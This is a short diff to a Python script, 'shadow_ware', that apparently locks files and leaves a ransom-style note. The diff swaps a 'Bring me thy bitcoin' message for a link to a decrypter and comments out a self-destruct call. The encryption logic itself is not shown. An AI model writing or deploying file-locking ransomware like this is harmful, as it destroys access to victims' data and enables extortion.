@@ -1,4 +1,5 @@
-instructions = "Bring me thy bitcoin."
+#!/usr/bin/env python3
+instructions = "https://github.com/PrestonDragon989/ShadowCrypt\n\nThe Decrypter can be found there, and run it next to all locked files to unlock them."
 
 import base64, random, os, hashlib, hmac, string, time
 
@@ -113,4 +114,4 @@ if __name__ == "__main__":
   shadow_ware.create_id()
   shadow_ware.remove_not_locked_files()
   shadow_ware.leave_instructions()
-  shadow_ware.self_destruct()
+  #shadow_ware.self_destruct()
